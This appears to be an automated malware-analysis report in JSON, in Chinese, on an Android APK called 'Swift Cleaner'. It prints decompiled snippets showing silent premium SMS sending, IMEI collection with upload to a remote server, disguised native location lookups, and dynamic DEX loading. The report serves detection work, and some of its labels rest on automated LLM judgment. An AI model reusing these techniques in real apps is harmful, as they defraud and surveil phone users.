@@ -1,0 +1,160 @@
+{
+  "APK信息": {
+    "文件名": "ab2c4886a4e0681a55b29c653b506b66721a3f36a1b098afa7f56da6f89bf5de.apk",
+    "sha256": "ab2c4886a4e0681a55b29c653b506b66721a3f36a1b098afa7f56da6f89bf5de",
+    "包名": "com.pho.nec.pcs",
+    "应用名": "Swift Cleaner",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 259.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\flow\\framework\\util\\AppUtils;",
+          "method_signature": "if(!TextUtils.isEmpty(destinationAddress)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void sendSms(Context context, String destinationAddress, String smsBody) {\n    if (!TextUtils.isEmpty(destinationAddress) && !TextUtils.isEmpty(smsBody)) {\n        SmsManager.getDefault().sendTextMessage(destinationAddress, null, smsBody, PendingIntent.getBroadcast(context, 0, new Intent(SSend.SMSSEND_INTENT), 0), PendingIntent.getBroadcast(context, 0, new Intent(\"SMS_DELIVERED_ACTION\"), 0));\n    }\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @TargetApi(4)\n>>>     public static void sendSms(Context context, String destinationAddress, String smsBody) {\n>>>         if (!TextUtils.isEmpty(destinationAddress) && !TextUtils.isEmpty(smsBody)) {\n>>>             Intent itSend = new Intent(SSend.SMSSEND_INTENT);\n>>>             Intent itDeliver = new Intent(\"SMS_DELIVERED_ACTION\");\n>>>             PendingIntent mSendPI = PendingIntent.getBroadcast(context, 0, itSend, 0);\n              PendingIntent mDeliverPI = PendingIntent.getBroadcast(context, 0, itDeliver, 0);\n              SmsManager.getDefault().sendTextMessage(destinationAddress, null, smsBody, mSendPI, mDeliverPI);\n          }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码和短信内容均来自外部传入参数 destinationAddress 与 smsBody，未经过用户确认即执行发送操作，可能造成短信欺诈、资费消耗或隐私外发。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei",
+          "getSubscriberId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\ali\\mobisecenhance\\ld\\tools\\BaseUpLoad;",
+          "method_signature": "if(!isPermision(context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager tm = (TelephonyManager) context.getSystemService(\"phone\");\nString device_imei = tm.getDeviceId() != null ? tm.getDeviceId() : \"null\";\nString upjson = getHttpContent(keyMd5, device_imei, context.getPackageName(), configs.enhanceVersion, configs.toString(), isFirstStartUp, startUpStatus, nativeStatus == null ? \"null\" : nativeStatus, crashinfo == null ? \"null\" : crashinfo, \"false\", appVersion == null ? \"null\" : appVersion);\nString finalUrl = genCrashReportUrl(Upload.urlFormat, baseUrl + Upload.api, keyMd5, 0, upjson);\nString result = doHttpConnect(finalUrl, upjson);",
+          "malicious_code_snippet_context": "              log.v(TAG, \"Permison not allow do Upload ,we have to Stop...\");\n              return false;\n          }\n>>>         TelephonyManager tm = (TelephonyManager) context.getSystemService(\"phone\");\n>>>         String device_imei = tm.getDeviceId() != null ? tm.getDeviceId() : \"null\";\n>>>         String crashinfo = CrashMonitor.getCrashInfo(baseDir);\n>>>         String appVersion = getAppVersion(context);\n>>>         log.v(TAG, \"enhanceVersion is  \" + configs.enhanceVersion);\n          log.v(TAG, \"appVersion is  \" + appVersion);\n          String upjson = getHttpContent(keyMd5, device_imei, context.getPackageName(), configs.enhanceVersion, configs.toString(), isFirstStartUp, startUpStatus, nativeStatus == null ? \"null\" : nativeStatus, crashinfo == null ? \"null\" : crashinfo, \"false\", appVersion == null ? \"null\" : appVersion);\n          log.v(TAG, \"upjson is \" + upjson);",
+          "behavior_description": "该代码通过 TelephonyManager.getDeviceId() 获取设备 IMEI 标识符，并将其与包名、应用版本、崩溃信息、启动状态等数据组装为 JSON，通过 HTTP 请求发送到远程服务器。IMEI 是设备唯一标识符，属于敏感隐私信息，未经用户明确授权采集并上传至远端属于隐私窃取行为。数据流向：getDeviceId() → getHttpContent() 组装JSON → doHttpConnect() 网络上传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "getLastKnownLocation",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v7\\app\\TwilightManager;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 0)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Init.doFixC(TwilightManager.class, -1274868272);\nif (Build.VERSION.SDK_INT < 0) {\n    z2.class.toString();\n}\npublic native Location getLastKnownLocation();\npublic native Location getLastKnownLocationForProvider(String str);\npublic native void updateState(@NonNull Location location);",
+          "malicious_code_snippet_context": "      private final TwilightState mTwilightState = new TwilightState();\n  \n      static {\n>>>         Init.doFixC(TwilightManager.class, -1274868272);\n>>>         if (Build.VERSION.SDK_INT < 0) {\n>>>             z2.class.toString();\n>>>         }\n>>>     }\n>>> \n>>>     /* JADX INFO: Access modifiers changed from: private */\n      public native Location getLastKnownLocation();\n  \n      /* JADX INFO: Access modifiers changed from: private */",
+          "behavior_description": "代码伪装成 Android Support Library 的 TwilightManager 类，通过 native 方法声明获取设备位置信息（getLastKnownLocation/getLastKnownLocationForProvider），并使用 Init.doFixC 进行动态代码修复或 native 库加载。Build.VERSION.SDK_INT < 0 为永假条件，可能用于反静态分析或隐藏真实控制流。位置数据通过 native 层处理，存在隐蔽上传至 C2 服务器的风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "dynamic_code_loading",
+      "中文名": "动态代码加载",
+      "MITRE": "T1407",
+      "置信度": "confirmed",
+      "证据": {
+        "方法引用": [
+          "Ldalvik/system/PathClassLoader;-><init>"
+        ],
+        "权限": [],
+        "字符串": [
+          "loadDex"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\ali\\mobisecenhance\\ld\\dexmode\\ArtDexFile;",
+          "method_signature": "genDexFile()",
+          "malicious_behavior": "dynamic_code_loading",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "DexFile result = DexFile.loadDex(this.mFileName, null, 0);",
+          "malicious_code_snippet_context": "      /* JADX INFO: Access modifiers changed from: package-private */\n      public DexFile genDexFile() {\n          try {\n>>>             DexFile result = DexFile.loadDex(this.mFileName, null, 0);\n              return result;\n          } catch (IOException e) {\n              e.printStackTrace();",
+          "behavior_description": "代码通过构造函数接收一个DEX文件路径(mFileName)，然后在genDexFile()方法中调用DexFile.loadDex()动态加载该路径指向的DEX文件，实现运行时动态代码加载，可绕过静态检测执行隐藏逻辑",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
